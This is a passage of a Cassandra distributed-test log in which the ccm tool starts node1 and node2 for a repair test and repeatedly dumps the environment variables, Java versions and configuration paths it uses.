f=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node1/conf'}
01:32:01 23:32:01,12 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node1/conf'}
01:32:01 23:32:01,13 ccm INFO node1: using Java 8 for the current invocation
01:32:01 23:32:01,13 ccm INFO node1: using Java 8 for the current invocation
01:32:01 23:32:01,112 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node1/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6'}
01:32:01 23:32:01,112 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node1/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6'}
01:32:01 23:32:01,113 ccm INFO node1: using Java 8 for the current invocation
01:32:01 23:32:01,113 ccm INFO node1: using Java 8 for the current invocation
01:32:01 23:32:01,157 ccm INFO Starting node1 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
01:32:01 23:32:01,157 ccm INFO Starting node1 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
01:32:01 23:32:01,329 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node2/conf'}
01:32:01 23:32:01,329 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node2/conf'}
01:32:01 23:32:01,329 ccm INFO node2: using Java 8 for the current invocation
01:32:01 23:32:01,329 ccm INFO node2: using Java 8 for the current invocation
01:32:01 23:32:01,442 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=